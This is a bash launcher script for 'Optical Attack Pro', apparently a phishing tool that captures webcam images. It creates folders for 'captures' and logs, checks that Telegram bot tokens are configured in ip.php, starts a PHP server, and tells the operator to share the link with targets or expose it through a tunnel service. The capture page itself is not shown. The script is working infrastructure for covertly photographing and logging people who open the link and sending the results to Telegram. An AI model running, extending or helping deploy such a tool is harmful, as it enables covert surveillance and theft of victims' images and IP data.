#!/bin/bash

# Optical Attack Pro - Server Start
# Made by Ahsan

clear
echo "╔════════════════════════════════════════╗"
echo "║      Optical Attack Pro - Server       ║"
echo "║         Made by Ahsan                  ║"
echo "╚════════════════════════════════════════╝"
echo ""

# Check if directories exist
if [ ! -d "optical_captures" ]; then
    mkdir -p optical_captures
fi
if [ ! -d "optical_logs" ]; then
    mkdir -p optical_logs
fi

# Check if PHP is configured
if grep -q "YOUR_BOT_TOKEN_HERE" ip.php 2>/dev/null; then
    echo "[!] ERROR: Telegram tokens not configured!"
    echo ""
    echo "Please run setup.sh first:"
    echo "  bash setup.sh"
    echo ""
    exit 1
fi

echo "[+] Telegram configuration: ✓ Verified"
echo "[+] Directory structure: ✓ Ready"
echo ""
echo "╔════════════════════════════════════════╗"
echo "║   Starting Optical Attack Pro Server   ║"
echo "╚════════════════════════════════════════╝"
echo ""
echo "🎯 Server running on: http://localhost:3333"
echo ""
echo "📸 Captured images: optical_captures/"
echo "📊 Activity logs: optical_logs/"
echo ""
echo "🔗 Share this local link:"
echo "   http://localhost:3333"
echo ""
echo "   or"
echo ""
echo "   http://YOUR_COMPUTER_IP:3333"
echo ""
echo "For cloud deployment:"
echo "  - Use your own cloud tunnel service"
echo "  - Recommended: cloudflare tunnel, frp, or custom solution"
echo ""
echo "Ctrl+C to stop the server"
echo ""

# Start PHP server
php -S localhost:3333
